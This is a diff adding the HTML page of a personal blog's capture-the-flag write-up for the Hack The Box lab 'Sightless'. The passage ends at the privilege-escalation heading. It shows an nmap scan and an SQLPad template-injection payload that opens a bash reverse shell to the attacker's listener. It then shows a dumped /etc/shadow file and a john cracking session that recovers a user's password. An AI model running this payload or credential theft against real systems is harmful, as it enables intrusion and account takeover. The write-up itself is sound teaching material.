@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/01/11/hackthebox-sightless/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewSightless is an easy-difficulty Hack The Box machine dealing initially with Remote Code Execution from an SQLPad subdomain -&gt; &#x2F;etc&#x2F;shadow abuse to read and crack user hashes -&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Sightless">
+<meta property="og:url" content="http://fouedsaidi.com/2025/01/11/Hackthebox-Sightless/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewSightless is an easy-difficulty Hack The Box machine dealing initially with Remote Code Execution from an SQLPad subdomain -&gt; &#x2F;etc&#x2F;shadow abuse to read and crack user hashes -&gt;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/Sightless.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/web1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/web2.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/sqlpad.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/sqlpad.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/froxlor.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/froxlor2.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/froxlor3.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/froxlor4.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/froxlor5.png">
+<meta property="article:published_time" content="2025-01-11T08:56:11.000Z">
+<meta property="article:modified_time" content="2025-01-11T10:45:44.223Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sightless/Sightless.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Sightless -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Sightless</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-01-11 09:56:11</span>
+        <span class="mobile">2025-01-11 09:56:11</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-01-11 11:45:44</span>
+            <span class="mobile">2025-01-11 11:45:44</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Sightless is an easy-difficulty Hack The Box machine dealing initially with Remote Code Execution from an SQLPad subdomain -&gt; &#x2F;etc&#x2F;shadow abuse to read and crack user hashes -&gt; Chrome Debugger abuse to read passwords from monitoring process -&gt; RCE using command injection to get our root flag.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sightless/Sightless.png"
+                      alt="Sightless-info-card"
+                ><figcaption>Sightless-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">231.103</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span><span class="literal">-01-11</span> <span class="number">10</span>:<span class="number">13</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">231.103</span></span><br><span class="line">Host is up (<span class="number">0.14</span>s latency).</span><br><span class="line">Not shown: <span class="number">997</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span>/tcp open  ftp</span><br><span class="line">| fingerprint<span class="literal">-strings</span>:</span><br><span class="line">|   GenericLines:</span><br><span class="line">|     <span class="number">220</span> ProFTPD Server (sightless.htb FTP Server) [::<span class="type">ffff</span>:<span class="number">10.129</span><span class="type">.231.103</span>]</span><br><span class="line">|     Invalid command: <span class="keyword">try</span> being more creative</span><br><span class="line">|_    Invalid command: <span class="keyword">try</span> being more creative</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">10</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> c9:<span class="number">6</span>e:<span class="number">3</span>b:<span class="number">8</span>f:c6:<span class="number">03</span>:<span class="number">29</span>:<span class="number">05</span>:e5:a0:ca:<span class="number">00</span>:<span class="number">90</span>:c9:<span class="number">5</span>c:<span class="number">52</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">9</span>b:de:<span class="number">3</span>a:<span class="number">27</span>:<span class="number">77</span>:<span class="number">3</span>b:<span class="number">1</span>b:e1:<span class="number">19</span>:<span class="number">5</span>f:<span class="number">16</span>:<span class="number">11</span>:be:<span class="number">70</span>:e0:<span class="number">56</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://sightless.htb/</span><br><span class="line"><span class="number">1</span> service unrecognized despite returning <span class="keyword">data</span>. <span class="keyword">If</span> you know the service/version, please submit the following fingerprint at https://nmap.org/cgi<span class="literal">-bin</span>/submit.cgi?<span class="built_in">new-service</span> :</span><br><span class="line">SF<span class="literal">-Port21-TCP</span>:V=<span class="number">7.95</span>%I=<span class="number">7</span>%D=<span class="number">1</span>/<span class="number">11</span>%Time=<span class="number">6782365</span>D%P=i686<span class="literal">-pc-windows-windows</span>%<span class="built_in">r</span>(</span><br><span class="line">SF:GenericLines,A3,<span class="string">&quot;220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2</span></span><br><span class="line"><span class="string">SF:0Server\)\x20\[::ffff:10\.129\.231\.103\]\r\n500\x20Invalid\x20command:</span></span><br><span class="line"><span class="string">SF:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20t</span></span><br><span class="line"><span class="string">SF:ry\x20being\x20more\x20creative\r\n&quot;</span>);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">104.27</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have ssh, ftp and http ports accessible. Both ftp and http are redirecting us towards the domain name of <code>sightless.htb</code> &#x3D;&gt; so let’s go ahead and add that entry to our <code>/etc/hosts</code> file!</p>
+<h3 id="Web-Application-http-sightless-htb"><a href="#Web-Application-http-sightless-htb" class="headerlink" title="Web Application - http://sightless.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://sightless.htb/" >http://sightless.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sightless/web1.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>This website doesn’t seem to have anything special, scrolling a bit down we can see a few of the offered services:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sightless/web2.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>Some common mistakes developers make when dealing with a subdomain that shouldn’t be disclosed yet (still in prod), is to name the subdomain after the feature. Let’s try to add those words [“SQLPad”,”Froxlor”] to our wordlist and check for available subdomains:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sightless/sqlpad.png"
+                      alt="SQLPad"
+                ><figcaption>SQLPad</figcaption></figure></p>
+<p>And yes! We got access to an SQLPad subdomain.</p>
+<p>Searching the mighty web for some exploits related to SQLPad panel, I stumbled into <a class="link"   target="_blank" rel="noopener" href="https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb" >this report <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> from <a class="link"   target="_blank" rel="noopener" href="https://huntr.com/" >https://huntr.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>It’s a Remote Code Execution vulnerability in the SQLPad panel when trying to add a new MySQL connection to the database. Lessdoit !<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sightless/sqlpad.png"
+                      alt="SQLPad"
+                ><figcaption>SQLPad</figcaption></figure></p>
+<p>This will be our payload:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).<span class="built_in">exec</span>(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.x.x/4444 0&gt;&amp;1&quot;&#x27;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>And we get a callback:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.x.x] from (UNKNOWN) [10.129.231.103] 47218</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@c184118df0a6:/var/lib/sqlpad<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@c184118df0a6:/var/lib/sqlpad<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>However, this is only a docker container.</p>
+<h3 id="User-Pivoting-Michael"><a href="#User-Pivoting-Michael" class="headerlink" title="User Pivoting - Michael"></a>User Pivoting - Michael</h3><p>Doing my usual checks, I found out that I could read the <code>/etc/shadow</code> file (which contains users password hashes):</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@c184118df0a6:/var/lib/sqlpad<span class="comment"># cat /etc/shadow</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$6$jn8fwk6LVJ9IYw30<span class="variable">$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z</span>/lEpBM90Ra4b.:19858:0:99999:7:::</span><br><span class="line">daemon:*:19051:0:99999:7:::</span><br><span class="line">bin:*:19051:0:99999:7:::</span><br><span class="line">sys:*:19051:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19051:0:99999:7:::</span><br><span class="line">games:*:19051:0:99999:7:::</span><br><span class="line">man:*:19051:0:99999:7:::</span><br><span class="line">lp:*:19051:0:99999:7:::</span><br><span class="line">mail:*:19051:0:99999:7:::</span><br><span class="line">news:*:19051:0:99999:7:::</span><br><span class="line">uucp:*:19051:0:99999:7:::</span><br><span class="line">proxy:*:19051:0:99999:7:::</span><br><span class="line">www-data:*:19051:0:99999:7:::</span><br><span class="line">backup:*:19051:0:99999:7:::</span><br><span class="line">list:*:19051:0:99999:7:::</span><br><span class="line">irc:*:19051:0:99999:7:::</span><br><span class="line">gnats:*:19051:0:99999:7:::</span><br><span class="line">nobody:*:19051:0:99999:7:::</span><br><span class="line">_apt:*:19051:0:99999:7:::</span><br><span class="line">node:!:19053:0:99999:7:::</span><br><span class="line">michael:$6<span class="variable">$mG3Cp2VPGY</span>.FDE8u<span class="variable">$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa</span>.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::</span><br><span class="line">root@c184118df0a6:/var/lib/sqlpad<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+<p>We can see that there is a <code>michael</code> user. Let’s get his hash and try to crack it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ john  -w=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span>                </span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;sha512crypt&quot;</span>, but the string is also recognized as <span class="string">&quot;HMAC-SHA256&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=HMAC-SHA256&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">insaneclownposse (?)     </span><br><span class="line">1g 0:00:00:17 DONE (2025-01-11 11:01) 0.05672g/s 3325p/s 3325c/s 3325C/s kruimel..galati</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">                                                                                                                                                                               </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">cat</span> <span class="built_in">hash</span>                                              </span><br><span class="line">$6<span class="variable">$mG3Cp2VPGY</span>.FDE8u<span class="variable">$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa</span>.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/</span><br><span class="line">                                                                                                                                                                               </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>And michael’s password is <code>insaneclownposse</code>. Let’s try to connect to the main machine using it and get our user flag:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">michael@sightless:~$ cat user.txt</span><br><span class="line">71febbb47666ca******************</span><br><span class="line">michael@sightless:~$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-Chrome-Remote-Debugger-to-RCE"><a href="#Privilege-Escalation-Chrome-Remote-Debugger-to-RCE" class="headerlink" title="Privilege Escalation - Chrome Remote Debugger to RCE"></a>Privilege Escalation - Chrome Remote Debugger to RCE</h3><p>Checking our connection on the machine for any machine running in the background, we find some interesting ports:</p>
